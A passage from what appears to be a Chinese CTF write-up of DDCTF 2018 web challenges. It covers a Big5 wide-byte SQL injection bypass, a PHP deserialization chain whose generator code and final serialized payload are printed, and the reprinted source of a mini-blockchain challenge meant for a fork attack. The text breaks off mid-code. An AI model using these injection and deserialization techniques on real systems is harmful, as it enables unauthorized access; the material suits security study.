class="title">byte2hex</span><span class="params">(<span class="keyword">byte</span>[] b)</span></span></div><div class="line">  &#123;</div><div class="line">    StringBuilder hs = <span class="keyword">new</span> StringBuilder();</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">0</span>; (b != <span class="keyword">null</span>) &amp;&amp; (n &lt; b.length); n++)</div><div class="line">    &#123;</div><div class="line">      String stmp = Integer.toHexString(b[n] &amp; <span class="number">0xFF</span>);</div><div class="line">      <span class="keyword">if</span> (stmp.length() == <span class="number">1</span>) &#123;</div><div class="line">        hs.append(<span class="string">'0'</span>);</div><div class="line">      &#125;</div><div class="line">      hs.append(stmp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> hs.toString().toUpperCase();</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>一开始以为是宽字节注入，试了很多方式都没试出来，突然看到了提示，如图，链接过去是一篇关于big编码说明的文件。。。</p><img src="/2018/04/19/ddctf-2018/8.png" alt="8.png" title=""><p>那思路很明确了，找一个big编码的字，第二位字节为 <code>0x5c</code> 即 <code>\</code> 转义掉gpc生成的 <code>\</code> 最后成功逃逸单引号 <code>\\&#39;</code></p><img src="/2018/04/19/ddctf-2018/9.png" alt="9.png" title=""><p>接下来就是常规注入了，注入完毕后发现，并没有flag。。。只有一个备份文件。。。算了，下载下来备份文件代码审计吧。</p><img src="/2018/04/19/ddctf-2018/10.png" alt="10.png" title=""><p>发现竟然有个<code>api</code> 接受一个字符串并反序列，直接就get到了考点，<strong>构造反序列化执行链，获取flag</strong></p><img src="/2018/04/19/ddctf-2018/11.png" alt="11.png" title=""><p>这个反序列执行链很简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">public</span> $sql;</div><div class="line"></div><div class="line">    <span class="comment">//</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;sql=<span class="keyword">new</span> SQL();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></div><div class="line">&#123;</div><div class="line">    </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">FlagGet</span><span class="params">($user)</span></span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> $user_uuid;</div><div class="line">    <span class="keyword">public</span> $fl;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$t =  <span class="keyword">new</span> Test();</div><div class="line">$t-&gt;fl = <span class="keyword">new</span> Flag();</div><div class="line">$t-&gt;user_uuid = <span class="string">"c09764a2-8d31-4643-907a-5d663b9348dc"</span>;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> serialize($t);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>生成 <code>O:4:&quot;Test&quot;:2:{s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:4:&quot;Flag&quot;:1:{s:3:&quot;sql&quot;;O:3:&quot;SQL&quot;:0:{}}}</code> 不过要把类名称改成<code>&quot;Index\Helper\Flag&quot;, &quot;Index\Helper\SQL&quot;,&quot;Index\Helper\Test&quot;</code>这种形式才能在远程环境执行。<br>最后的payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:17:&quot;Index\Helper\Test&quot;:2:&#123;s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:17:&quot;Index\Helper\Flag&quot;:1:&#123;s:3:&quot;sql&quot;;O:16:&quot;Index\Helper\SQL&quot;:0:&#123;&#125;&#125;&#125;</div></pre></td></tr></table></figure><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>有关于区块链的代码审计，也是第一次接触到区块链的具体原理，分析了一天，收获蛮大的，这边其实可以利用<strong>区块链分叉攻击</strong>来实现bank未被hack掉的区块链链路（只要这个链路比被hack掉的链路长就可以了。）</p><p>mini区块链源码如下（对学习区块链还是挺有意思）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></div><div class="line"><span class="comment"># written in python 2.7</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> hashlib, json, rsa, uuid</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">app = Flask(__name__)</div><div class="line">app.secret_key = <span class="string">'*********************'</span></div><div class="line">url_prefix = <span class="string">'/b9744af30897e'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'Here is your flag: DDCTF&#123;******************&#125;'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(x)</span>:</span></div><div class="line">    <span class="keyword">return</span> hashlib.sha256(hashlib.md5(x).digest()).hexdigest()</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_reducer</span><span class="params">(x, y)</span>:</span></div><div class="line">    <span class="keyword">return</span> hash(hash(x)+hash(y))</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_attrs</span><span class="params">(d, attrs)</span>:</span></div><div class="line">    <span class="keyword">if</span> type(d) != type(&#123;&#125;): <span class="keyword">raise</span> Exception(<span class="string">"Input should be a dict/JSON"</span>)</div><div class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> attrs:</div><div class="line">        <span class="keyword">if</span> attr <span class="keyword">not</span> <span class="keyword">in</span> d:</div><div class="line">            <span class="keyword">raise</span> Exception(<span class="string">"&#123;&#125; should be presented in the input"</span>.format(attr))</div><div class="line"></div><div class="line">EMPTY_HASH = <span class="string">'0'</span>*<span class="number">64</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr_to_pubkey</span><span class="params">(address)</span>:</span></div><div class="line">    <span class="keyword">return</span> rsa.PublicKey(int(address, <span class="number">16</span>), <span class="number">65537</span>)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pubkey_to_address</span><span class="params">(pubkey)</span>:</span></div><div class="line">    <span class="keyword">assert</span> pubkey.e == <span class="number">65537</span></div><div class="line">    hexed = hex(pubkey.n)</div><div class="line">    <span class="keyword">if</span> hexed.endswith(<span class="string">'L'</span>): hexed = hexed[:<span class="number">-1</span>]</div><div class="line">    <span class="keyword">if</span> hexed.startswith(<span class="string">'0x'</span>): hexed = hexed[<span class="number">2</span>:]</div><div class="line">    <span class="keyword">return</span> hexed</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_addr_key_pair</span><span class="params">()</span>:</span></div><div class="line">    pubkey, privkey = rsa.newkeys(<span class="number">384</span>)</div><div class="line">    <span class="keyword">return</span> pubkey_to_address(pubkey), privkey</div><div class="line"></div><div class="line">bank_address, bank_privkey = gen_addr_key_pair()</div><div class="line">hacker_address, hacker_privkey = gen_addr_key_pair()</div><div class="line">shop_address, shop_privkey = gen_addr_key_pair()</div><div class="line">shop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()</div><div class="line"></div><div class="line">my_address, my_privkey = gen_addr_key_pair()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_input_utxo</span><span class="params">(input_utxo_id, privkey)</span>:</span></div><div class="line">    <span class="keyword">return</span> rsa.sign(input_utxo_id, privkey, <span class="string">'SHA-1'</span>).encode(<span class="string">'hex'</span>)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_utxo</span><span class="params">(utxo)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [utxo[<span class="string">'id'</span>], utxo[<span class="string">'addr'</span>], str(utxo[<span class="string">'amount'</span>])])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_output_utxo</span><span class="params">(addr_to, amount)</span>:</span></div><div class="line">    utxo = &#123;<span class="string">'id'</span>: str(uuid.uuid4()), <span class="string">'addr'</span>: addr_to, <span class="string">'amount'</span>: amount&#125;</div><div class="line">    utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</div><div class="line">    <span class="keyword">return</span> utxo</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_tx</span><span class="params">(tx)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [</div><div class="line">        reduce(hash_reducer, tx[<span class="string">'input'</span>], EMPTY_HASH),</div><div class="line">        reduce(hash_reducer, [utxo[<span class="string">'hash'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]], EMPTY_HASH)</div><div class="line">    ])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx</span><span class="params">(input_utxo_ids, output_utxo, privkey_from=None)</span>:</span></div><div class="line">    tx = &#123;<span class="string">'input'</span>: input_utxo_ids, <span class="string">'signature'</span>: [sign_input_utxo(id, privkey_from) <span class="keyword">for</span> id <span class="keyword">in</span> input_utxo_ids], <span class="string">'output'</span>: output_utxo&#125;</div><div class="line">    tx[<span class="string">'hash'</span>] = hash_tx(tx)</div><div class="line">    <span class="keyword">return</span> tx</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_block</span><span class="params">(block)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], reduce(hash_reducer, [tx[<span class="string">'hash'</span>] <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]], EMPTY_HASH)])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_block</span><span class="params">(prev_block_hash, nonce_str, transactions)</span>:</span></div><div class="line">    <span class="keyword">if</span> type(prev_block_hash) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">'prev_block_hash should be hex-encoded hash value'</span>)</div><div class="line">    nonce = str(nonce_str)</div><div class="line">    <span class="keyword">if</span> len(nonce) &gt; <span class="number">128</span>: <span class="keyword">raise</span> Exception(<span class="string">'the nonce is too long'</span>)</div><div class="line">    block = &#123;<span class="string">'prev'</span>: prev_block_hash, <span class="string">'nonce'</span>: nonce, <span class="string">'transactions'</span>: transactions&#125;</div><div class="line">    block[<span class="string">'hash'</span>] = hash_block(block)</div><div class="line">    <span class="keyword">return</span> block</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_blockchain_tail</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> max(session[<span class="string">'blocks'</span>].values(), key=<span class="keyword">lambda</span> block: block[<span class="string">'height'</span>])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_utxo</span><span class="params">(blockchain_tail)</span>:</span></div><div class="line">    curr_block = blockchain_tail</div><div class="line">    blockchain = [curr_block]</div><div class="line">    <span class="keyword">while</span> curr_block[<span class="string">'hash'</span>] != session[<span class="string">'genesis_block_hash'</span>]:</div><div class="line">        curr_block = session[<span class="string">'blocks'</span>][curr_block[<span class="string">'prev'</span>]]</div><div class="line">        blockchain.append(curr_block)</div><div class="line">    blockchain = blockchain[::<span class="number">-1</span>]</div><div class="line">    utxos = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blockchain:</div><div class="line">        <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</div><div class="line">            <span class="keyword">for</span> input_utxo_id <span class="keyword">in</span> tx[<span class="string">'input'</span>]:</div><div class="line">                <span class="keyword">del</span> utxos[input_utxo_id]</div><div class="line">            <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</div><div class="line">                utxos[utxo[<span class="string">'id'</span>]] = utxo</div><div class="line">    <span class="keyword">return</span> utxos</div><div class="line">        </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_balance</span><span class="params">(utxos)</span>:</span></div><div class="line">    balance = &#123;bank_address: <span class="number">0</span>, hacker_address: <span class="number">0</span>, shop_address: <span class="number">0</span>&#125;</div><div class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</div><div class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] <span class="keyword">not</span> <span class="keyword">in</span> balance:</div><div class="line">            balance[utxo[<span class="string">'addr'</span>]] = <span class="number">0</span></div><div class="line">        balance[utxo[<span class="string">'addr'</span>]] += utxo[<span class="string">'amount'</span>]</div><div class="line">    <span class="keyword">return</span> balance</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_utxo_signature</span><span class="params">(address, utxo_id, signature)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">return</span> rsa.verify(utxo_id, signature.decode(<span class="string">'hex'</span>), addr_to_pubkey(address))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">append_block</span><span class="params">(block, difficulty=int<span class="params">(<span class="string">'f'</span>*<span class="number">64</span>, <span class="number">16</span>)</span>)</span>:</span></div><div class="line">    has_attrs(block, [<span class="string">'prev'</span>, <span class="string">'nonce'</span>, <span class="string">'transactions'</span>])</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'prev'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'prev'</span>] = str(block[<span class="string">'prev'</span>])</div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'nonce'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'nonce'</span>] = str(block[<span class="string">'nonce'</span>])</div><div class="line">    <span class="comment"># print session['blocks']</span></div><div class="line">    <span class="comment"># print ['prev']</span></div><div class="line">    <span class="keyword">if</span> block[<span class="string">'prev'</span>] <span class="keyword">not</span> <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">"unknown parent block"</span>)</div><div class="line">    tail = session[<span class="string">'blocks'</span>][block[<span class="string">'prev'</span>]]</div><div class="line">    utxos = calculate_utxo(tail)</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'transactions'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">'Please put a transaction array in the block'</span>)</div><div class="line">    new_utxo_ids = set()</div><div class="line">    <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</div><div class="line">        has_attrs(tx, [<span class="string">'input'</span>, <span class="string">'output'</span>, <span class="string">'signature'</span>])</div><div class="line">        </div><div class="line">        <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</div><div class="line">            has_attrs(utxo, [<span class="string">'amount'</span>, <span class="string">'addr'</span>, <span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'id'</span>] = str(utxo[<span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'addr'</span>] = str(utxo[<span class="string">'addr'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> utxo[<span class="string">'id'</span>] <span class="keyword">in</span> new_utxo_ids: <span class="keyword">raise</span> Exception(<span class="string">"output utxo of same id(&#123;&#125;) already exists."</span>.format(utxo[<span class="string">'id'</span>]))</div><div class="line">            new_utxo_ids.add(utxo[<span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'amount'</span>]) != type(<span class="number">1</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of amount of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> utxo[<span class="string">'amount'</span>] &lt;= <span class="number">0</span>: <span class="keyword">raise</span> Exception(<span class="string">"invalid amount of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of address of output utxo"</span>)</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                addr_to_pubkey(utxo[<span class="string">'addr'</span>])</div><div class="line">            <span class="keyword">except</span>:</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"invalid type of address(&#123;&#125;)"</span>.format(utxo[<span class="string">'addr'</span>]))</div><div class="line">            utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</div><div class="line">        tot_output = sum([utxo[<span class="string">'amount'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]])</div><div class="line">        </div><div class="line">        <span class="keyword">if</span> type(tx[<span class="string">'input'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo ids in tx should be array"</span>)</div><div class="line">        <span class="keyword">if</span> type(tx[<span class="string">'signature'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo signatures in tx should be array"</span>)</div><div class="line">        <span class="keyword">if</span> len(tx[<span class="string">'input'</span>]) != len(tx[<span class="string">'signature'</span>]): <span class="keyword">raise</span> Exception(<span class="string">"lengths of arrays of ids and signatures of input utxos should be the same"</span>)</div><div class="line">        tot_input = <span class="number">0</span></div><div class="line">        tx[<span class="string">'input'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'input'</span>]]</div><div class="line">        tx[<span class="string">'signature'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'signature'</span>]]</div><div class="line">        <span class="keyword">for</span> utxo_id, signature <span class="keyword">in</span> zip(tx[<span class="string">'input'</span>], tx[<span class="string">'signature'</span>]):</div><div class="line">            <span class="keyword">if</span> type(utxo_id) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of input utxo"</span>)</div><div class="line">            <span class="keyword">print</span> utxos</div><div class="line">            <span class="keyword">if</span> utxo_id <span class="keyword">not</span> <span class="keyword">in</span> utxos: <span class="keyword">raise</span> Exception(<span class="string">"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed."</span>.format(utxo_id))</div><div class="line">            utxo = utxos[utxo_id]</div><div class="line">            <span class="keyword">if</span> type(signature) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of signature of input utxo"</span>)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> verify_utxo_signature(utxo[<span class="string">'addr'</span>], utxo_id, signature):</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!"</span>.format(utxo_id))</div><div class="line">            tot_input += utxo[<span class="string">'amount'</span>]</div><div class="line">            <span class="keyword">del</span> utxos[utxo_id]</div><div class="line">        <span class="keyword">if</span> tot_output &gt; tot_input:</div><div class="line">            <span class="keyword">raise</span> Exception(<span class="string">"You don't have enough amount of DDCoins in the input utxo! &#123;&#125;/&#123;&#125;"</span>.format(tot_input, tot_output))</div><div class="line">        tx[<span class="string">'hash'</span>] = hash_tx(tx)</div><div class="line">    </div><div class="line">    block = create_block(block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], block[<span class="string">'transactions'</span>])</div><div class="line">    <span class="comment"># print block['hash']</span></div><div class="line">    block_hash = int(block[<span class="string">'hash'</span>], <span class="number">16</span>)</div><div class="line">    <span class="comment"># print block_hash</span></div><div class="line">    <span class="comment"># print difficulty</span></div><div class="line">    <span class="keyword">if</span> block_hash &gt; difficulty: <span class="keyword">raise</span> Exception(<span class="string">'Please provide a valid Proof-of-Work'</span>)</div><div class="line">    block[<span class="string">'height'</span>] = tail[<span class="string">'height'</span>]+<span class="number">1</span></div><div class="line">    <span class="keyword">if</span> len(session[<span class="string">'blocks'</span>]) &gt; <span class="number">50</span>: <span class="keyword">raise</span> Exception(<span class="string">'The blockchain is too long. Use ./reset to reset the blockchain'</span>)</div><div class="line">    <span class="keyword">if</span> block[<span class="string">'hash'</span>] <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">'A same block is already in the blockchain'</span>)</div><div class="line">    session[<span class="string">'blocks'</span>][block[<span class="string">'hash'</span>]] = block</div><div class="line">    session.modified = <span class="keyword">True</span></div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</div><div class="line">        session[<span class="string">'blocks'</span>] = &#123;&#125;</div><div class="line">        session[<span class="string">'your_diamonds'</span>] = <span class="number">0</span></div><div class="line">    </div><div class="line">        <span class="comment"># First, the bank issued some DDCoins ...</span></div><div class="line">        total_currency_issued = create_output_utxo(bank_address, <span class="number">1000000</span>)</div><div class="line">        <span class="comment"># print "lalala:"+str(total_currency_issued)</span></div><div class="line">        genesis_transaction = create_tx([], [total_currency_issued]) <span class="comment"># create DDCoins from nothing</span></div><div class="line">        <span class="comment"># print genesis_transaction</span></div><div class="line">        genesis_block = create_block(EMPTY_HASH, <span class="string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span>, [genesis_transaction])</div><div class="line">        session[<span class="string">'genesis_block_hash'</span>] = genesis_block[<span class="string">'hash'</span>]</div><div class="line">        genesis_block[<span class="string">'height'</span>] = <span class="number">0</span></div><div class="line">        session[<span 